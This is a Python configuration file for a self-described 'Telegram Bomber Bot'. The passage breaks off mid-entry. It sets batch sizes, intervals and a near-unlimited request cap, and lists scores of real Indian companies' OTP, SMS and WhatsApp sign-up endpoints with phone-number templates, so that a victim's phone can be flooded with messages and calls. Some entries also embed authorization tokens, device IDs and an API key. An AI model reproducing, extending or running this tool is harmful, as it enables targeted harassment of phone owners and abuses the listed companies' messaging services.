# config.py
# Complete API collection for Telegram Bomber Bot
# Total: 114 SMS/WhatsApp APIs + 13 Call APIs = 127 APIs
# Organized for easy reading and maintenance

import os
from dotenv import load_dotenv

load_dotenv()

# ============================================================
# BOT CONFIGURATION
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "0"))
PORT = int(os.getenv("PORT", 10000))
WEBHOOK_URL = os.getenv("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")

# ============================================================
# BOMBING SETTINGS
# ============================================================
BATCH_SIZE = 55                     # SMS/WhatsApp APIs per batch
SMS_INTERVAL = 10                   # Seconds between SMS/WhatsApp batches
CALL_INTERVAL = 45                  # Seconds between each call API
MAX_REQUEST_LIMIT = 999999999
TELEGRAM_RATE_LIMIT_SECONDS = 5
NORMAL_USER_AUTO_STOP_SECONDS = 10 * 60   # 10 minutes for normal users

# ============================================================
# LOGGING & FORCE CHANNELS
# ============================================================
LOG_CHANNEL_ID = -1003712674883     # Replace with your log channel ID
FORCE_CHANNELS = [
    {"name": "All Data Here", "link": "https://t.me/all_data_here", "id": -1003090922367},
    {"name": "OSINT Lookup", "link": "https://t.me/osint_lookup", "id": -1003698567122},
]

BRANDING = "\n\n🤖 <b>Powered by NULL PROTOCOL</b>"

# ============================================================
# SECTION 1: SMS APIS (77 from ANURAGXNOTHING)
# ============================================================

SMS_WHATSAPP_APIS = []

SMS_WHATSAPP_APIS.extend([
    {
        "name": "Lenskart SMS",
        "type": "sms",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phoneCode":"+91","telephone":"{phone}"}'
    },
    {
        "name": "NoBroker SMS",
        "type": "sms",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data_template": "phone={phone}&countryCode=IN"
    },
    {
        "name": "PharmEasy SMS",
        "type": "sms",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}"}'
    },
    {
        "name": "Wakefit SMS",
        "type": "sms",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}"}'
    },
    {
        "name": "Byju's SMS",
        "type": "sms",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}"}'
    },
    {
        "name": "Hungama OTP",
        "type": "sms",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}'
    },
    {
        "name": "Meru Cab",
        "type": "sms",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data_template": "mobile_number={phone}"
    },
    {
        "name": "Doubtnut",
        "type": "sms",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data_template": '{"phone_number":"{phone}","language":"en"}'
    },
    {
        "name": "PenPencil",
        "type": "sms",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data_template": '{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}'
    },
    {
        "name": "Snitch",
        "type": "sms",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile_number":"+91{phone}"}'
    },
    {
        "name": "Dayco India",
        "type": "sms",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data_template": "api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "name": "BeepKart",
        "type": "sms",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}","city":362}'
    },
    {
        "name": "Lending Plate",
        "type": "sms",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data_template": "mobiles={phone}&resend=Resend"
    },
    {
        "name": "ShipRocket",
        "type": "sms",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobileNumber":"{phone}"}'
    },
    {
        "name": "GoKwik",
        "type": "sms",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}","country":"in"}'
    },
    {
        "name": "NewMe",
        "type": "sms",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile_number":"{phone}","resend_otp_request":true}'
    },
    {
        "name": "Univest",
        "type": "sms",
        "url": "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {},
        "data_template": None
    },
    {
        "name": "Smytten",
        "type": "sms",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}","email":"test@example.com"}'
    },
    {
        "name": "CaratLane",
        "type": "sms",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"query":"mutation {SendOtp(input: {mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}) {status {message code}}}"}'
    },
    {
        "name": "BikeFixup",
        "type": "sms",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data_template": '{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}'
    },
    {
        "name": "WellAcademy",
        "type": "sms",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data_template": '{"contact_no":"{phone}"}'
    },
    {
        "name": "ServeTel",
        "type": "sms",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        "data_template": "mobile_number={phone}"
    },
    {
        "name": "GoPink Cabs",
        "type": "sms",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data_template": "check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Shemaroome",
        "type": "sms",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data_template": "mobile_no=%2B91{phone}"
    },
    {
        "name": "Cossouq",
        "type": "sms",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data_template": "mobilenumber={phone}&otptype=register"
    },
    {
        "name": "MyImagineStore",
        "type": "sms",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data_template": "mobile={phone}"
    },
    {
        "name": "Otpless",
        "type": "sms",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","selectedCountryCode":"+91"}'
    },
    {
        "name": "MyHubble Money",
        "type": "sms",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phoneNumber":"{phone}","channel":"SMS"}'
    },
    {
        "name": "Tata Capital Business",
        "type": "sms",
        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}'
    },
    {
        "name": "DealShare",
        "type": "sms",
        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","hashCode":"k387IsBaTmn"}'
    },
    {
        "name": "Snapmint",
        "type": "sms",
        "url": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}"}'
    },
    {
        "name": "Housing.com",
        "type": "sms",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}","country_url_name":"in"}'
    },
    {
        "name": "RentoMojo",
        "type": "sms",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}"}'
    },
    {
        "name": "Khatabook",
        "type": "sms",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}","app_signature":"wk+avHrHZf2"}'
    },
    {
        "name": "Netmeds",
        "type": "sms",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}"}'
    },
    {
        "name": "Nykaa",
        "type": "sms",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data_template": "source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
    },
    {
        "name": "RummyCircle",
        "type": "sms",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","isPlaycircle":false}'
    },
    {
        "name": "Animall",
        "type": "sms",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}'
    },
    {
        "name": "PenPencil V3",
        "type": "sms",
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}"}'
    },
    {
        "name": "Entri",
        "type": "sms",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}"}'
    },
    {
        "name": "Cosmofeed",
        "type": "sms",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}","version":"1.4.28"}'
    },
    {
        "name": "Aakash",
        "type": "sms",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}'
    },
    {
        "name": "Revv",
        "type": "sms",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","deviceType":"website"}'
    },
    {
        "name": "DeHaat",
        "type": "sms",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","client_id":"kisan-app"}'
    },
    {
        "name": "A23 Games",
        "type": "sms",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}'
    },
    {
        "name": "Spencer's",
        "type": "sms",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}"}'
    },
    {
        "name": "PayMe India",
        "type": "sms",
        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}","app_signature":"S10ePIIrbH3"}'
    },
    {
        "name": "Shopper's Stop",
        "type": "sms",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}'
    },
    {
        "name": "Hyuga Auth",
        "type": "sms",
        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}"}'
    },
    {
        "name": "BigCash",
        "type": "sms",
        "url": "https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
        "method": "GET",
        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
        "data_template": None
    },
    {
        "name": "Lifestyle Stores",
        "type": "sms",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"signInMobile":"{phone}","channel":"sms"}'
    },
    {
        "name": "WorkIndia",
        "type": "sms",
        "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        "method": "GET",
        "headers": {},
        "data_template": None
    },
    {
        "name": "PokerBaazi",
        "type": "sms",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","mfa_channels":"phno"}'
    },
    {
        "name": "My11Circle",
        "type": "sms",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data_template": '{"mobile":"{phone}"}'
    },
    {
        "name": "MamaEarth",
        "type": "sms",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}"}'
    },
    {
        "name": "HomeTriangle",
        "type": "sms",
        "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}"}'
    },
    {
        "name": "Wellness Forever",
        "type": "sms",
        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data_template": "method=firstRegisterApi&data={\"customerMobile\":\"{phone}\",\"generateOtp\":\"true\"}"
    },
    {
        "name": "HealthMug",
        "type": "sms",
        "url": "https://api.healthmug.com/account/createotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}"}'
    },
    {
        "name": "Vyapar",
        "type": "sms",
        "url": "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
        "method": "GET",
        "headers": {},
        "data_template": None
    },
    {
        "name": "Kredily",
        "type": "sms",
        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}"}'
    },
    {
        "name": "Tata Motors",
        "type": "sms",
        "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","sendOtp":"true"}'
    },
    {
        "name": "Moglix",
        "type": "sms",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","buildVersion":"24.0"}'
    },
    {
        "name": "MyGov",
        "type": "sms",
        "url": "https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male",
        "method": "GET",
        "headers": {},
        "data_template": None
    },
    {
        "name": "TrulyMadly",
        "type": "sms",
        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","locale":"IN"}'
    },
    {
        "name": "Apna",
        "type": "sms",
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","hash_type":"play_store"}'
    },
    {
        "name": "CodFirm",
        "type": "sms",
        "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
        "method": "GET",
        "headers": {},
        "data_template": None
    },
    {
        "name": "Swipe",
        "type": "sms",
        "url": "https://app.getswipe.in/api/user/mobile_login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","resend":true}'
    },
    {
        "name": "More Retail",
        "type": "sms",
        "url": "https://omni-api.moreretail.in/api/v1/login/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}'
    },
    {
        "name": "Country Delight",
        "type": "sms",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","platform":"Android","mode":"new_user"}'
    },
    {
        "name": "AstroSage",
        "type": "sms",
        "url": "https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}",
        "method": "GET",
        "headers": {},
        "data_template": None
    },
    {
        "name": "Rapido",
        "type": "sms",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}"}'
    },
    {
        "name": "TooToo",
        "type": "sms",
        "url": "https://tootoo.in/graphql",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"query":"query sendOtp($mobile_no: String!, $resend: Int!) { sendOtp(mobile_no: $mobile_no, resend: $resend) { success __typename } }","variables":{"mobile_no":"{phone}","resend":0}}'
    },
    {
        "name": "ConfirmTkt",
        "type": "sms",
        "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
        "method": "GET",
        "headers": {},
        "data_template": None
    },
    {
        "name": "BetterHalf",
        "type": "sms",
        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","isd_code":"91"}'
    },
    {
        "name": "Charzer",
        "type": "sms",
        "url": "https://api.charzer.com/auth-service/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}","appSource":"CHARZER_APP"}'
    },
    {
        "name": "Nuvama Wealth",
        "type": "sms",
        "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobileNo":"{phone}","emailID":"test@example.com"}'
    },
    {
        "name": "Mpokket",
        "type": "sms",
        "url": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}"}'
    }
])

# ============================================================
# SECTION 2: WHATSAPP APIS (6 from ANURAGXNOTHING)
# ============================================================

SMS_WHATSAPP_APIS.extend([
    {
        "name": "KPN WhatsApp",
        "type": "whatsapp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json"
        },
        "data_template": '{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{phone}"}}'
    },
    {
        "name": "Foxy WhatsApp",
        "type": "whatsapp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"user":{"phone_number":"+91{phone}"},"via":"whatsapp"}'
    },
    {
        "name": "Stratzy WhatsApp",
        "type": "whatsapp",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phoneNo":"{phone}"}'
    },
    {
        "name": "Jockey WhatsApp",
        "type": "whatsapp",
        "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data_template": None
    },
    {
        "name": "Rappi WhatsApp",
        "type": "whatsapp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data_template": '{"country_code":"+91","phone":"{phone}"}'
    },
    {
        "name": "Eka Care WhatsApp",
        "type": "whatsapp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data_template": '{"payload":{"allowWhatsapp":true,"mobile":"+91{phone}"},"type":"mobile"}'
    }
])

# ============================================================
# SECTION 3: EXISTING BOT'S SMS APIS (31 from old getapi)
# ============================================================

SMS_WHATSAPP_APIS.extend([
    {
        "name": "OyoRooms",
        "type": "sms",
        "url": "https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B91&nod=4&phone={phone}",
        "method": "GET",
        "headers": {},
        "data_template": None
    },
    {
        "name": "Delhivery",
        "type": "sms",
        "url": "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
        "method": "GET",
        "headers": {},
        "data_template": None
    },
    {
        "name": "ConfirmTkt Register",
        "type": "sms",
        "url": "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={phone}",
        "method": "GET",
        "headers": {},
        "data_template": None
    },
    {
        "name": "PharmEasy (old)",
        "type": "sms",
        "url": "https://pharmeasy.in/api/auth/requestOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"contactNumber":"{phone}"}'
    },
    {
        "name": "Hero MotoCorp",
        "type": "sms",
        "url": "https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data_template": "mobile_no={phone}&randome=ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=&mobile_no_otp=&csrf=523bc3fa1857c4df95e4d24bbd36c61b"
    },
    {
        "name": "IndiaLends",
        "type": "sms",
        "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data_template": "aeyder03teaeare=1&ertysvfj74sje=91&jfsdfu14hkgertd={phone}&lj80gertdfg=0"
    },
    {
        "name": "Flipkart Signup",
        "type": "sms",
        "url": "https://www.flipkart.com/api/6/user/signup/status",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data_template": '{"loginId":["+91{phone}"],"supportAllStates":true}'
    },
    {
        "name": "Flipkart OTP",
        "type": "sms",
        "url": "https://www.flipkart.com/api/5/user/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data_template": "loginId=+91{phone}&state=VERIFIED&churnEmailRequest=false"
    },
    {
        "name": "Lenskart (old)",
        "type": "sms",
        "url": "https://www.ref-r.com/clients/lenskart/smsApi",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data_template": "mobile={phone}&submit=1&undefined="
    },
    {
        "name": "Practo",
        "type": "sms",
        "url": "https://accounts.practo.com/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data_template": "client_name=Practo Android App&mobile=+91{phone}&fingerprint=&device_name=samsung+SM-G9350"
    },
    {
        "name": "PizzaHut",
        "type": "sms",
        "url": "https://m.pizzahut.co.in/api/cart/send-otp?langCode=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"customer":{"MobileNo":"{phone}","UserName":"{phone}","merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"}}'
    },
    {
        "name": "Goibibo (old)",
        "type": "sms",
        "url": "https://www.goibibo.com/common/downloadsms/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data_template": "mbl={phone}"
    },
    {
        "name": "Apollo Pharmacy",
        "type": "sms",
        "url": "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data_template": "mobile={phone}"
    },
    {
        "name": "Ajio",
        "type": "sms",
        "url": "https://www.ajio.com/api/auth/signupSendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"firstName":"SpeedX","login":"johnyaho@gmail.com","password":"Rock@5star","genderType":"Male","mobileNumber":"{phone}","requestType":"SENDOTP"}'
    },
    {
        "name": "AltBalaji",
        "type": "sms",
        "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"country_code":"91","phone_number":"{phone}"}'
    },
    {
        "name": "Aala",
        "type": "sms",
        "url": "https://www.aala.com/accustomer/ajax/getOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data_template": "email=91{phone}&firstname=SpeedX&lastname=SpeedX"
    },
    {
        "name": "Grab",
        "type": "sms",
        "url": "https://api.grab.com/grabid/v1/phone/otp",
        "method": "POST",
        "headers": {},
        "data_template": '{"method":"SMS","countryCode":"id","phoneNumber":"91{phone}","templateID":"pax_android_production"}'
    },
    {
        "name": "GheeAPI",
        "type": "sms",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo",
            "gk-merchant-id": "19g6im8srkz9y"
        },
        "data_template": '{"phone":"{phone}","country":"IN"}'
    },
    {
        "name": "EdzAPI",
        "type": "sms",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzMzc1OCwiZXhwIjoxNzU3NDMzODE4fQ._L8MBwvDff7ijaweocA302oqIA8dGOsJisPydxytvf8",
            "gk-merchant-id": "19an4fq2kk5y"
        },
        "data_template": '{"phone":"{phone}","country":"IN"}'
    },
    {
        "name": "FalconAPI",
        "type": "sms",
        "url": "https://api.breeze.in/session/start",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-device-id": "A1pKVEDhlv66KLtoYsml3",
            "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
        },
        "data_template": '{"phoneNumber":"{phone}","authVerificationType":"otp","device":{"id":"A1pKVEDhlv66KLtoYsml3","platform":"Chrome","type":"Desktop"},"countryCode":"+91"}'
    },
    {
        "name": "NeclesAPI",
        "type": "sms",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzNTg0OCwiZXhwIjoxNzU3NDM1OTA4fQ._37TKeyXUxkMEEteU2IIVeSENo8TXaNv32x5rWaJbzA",
            "gk-merchant-id": "19g6ilhej3mfc"
        },
        "data_template": '{"phone":"{phone}","country":"IN"}'
    },
    {
        "name": "KisanAPI",
        "type": "sms",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile_number":"{phone}","client_id":"kisan-app"}'
    },
    {
        "name": "PWAPI",
        "type": "sms",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "randomid": "de6f4924-22f5-42f5-ad80-02080277eef7"
        },
        "data_template": '{"mobile":"{phone}","organizationId":"5eb393ee95fab7468a79d189"}'
    },
    {
        "name": "Khatabook (old)",
        "type": "sms",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-kb-app-locale": "en",
            "x-kb-app-name": "Khatabook Website",
            "x-kb-app-version": "000100",
